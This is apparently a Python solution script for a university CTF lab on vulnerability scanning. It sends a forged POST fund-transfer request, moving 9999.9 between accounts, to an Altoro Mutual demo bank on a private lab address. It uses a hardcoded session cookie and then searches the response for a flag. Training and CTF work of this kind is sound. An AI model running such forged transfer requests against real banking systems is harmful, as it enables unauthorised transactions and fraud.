import requests
import re
import http_vlue as hv

print("物智学院CTF平台")
print("课程：漏洞扫描与安全审计")
print("实验5_http-post-static")

url = 'http://10.68.6.202:'
port = input("请输入端口:")
uurl = '/?transfer=1&fromAccount=1&toAccount=2&transferAmount=9999.9'

headers = {
    'POST': '/altoro/bank/doTransfer',  # Added comma here
    'AltoroAccounts': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0mitu',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.68.6.202:'+port,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'http://10.68.6.202:'+port,
    'Cookie': 'session=f5e7ea92-8b35-4a61-8a86-70ec91a4ef8a.XdcaubJQlIBX3Z-qA09rJtqx-dM'
}
if hv.get_qx():
    # 提交 POST 请求
    response = requests.post(url + port + uurl, headers=headers)
    # 从响应文本中查找 Flag
    flag_match = re.search(r'Flag\{([\w-]+)\}', response.text)
    if flag_match:
        flag = flag_match.group(1).strip()
        print("这个似乎是答案：", "Flag{"+flag+"}")
        input("请按回车键继续...")
    else:
        print("未找到 Flag。")
        input("请按回车键继续...")
else:
    print("失败，原因：权限不足！")
    input("请按回车键继续...")
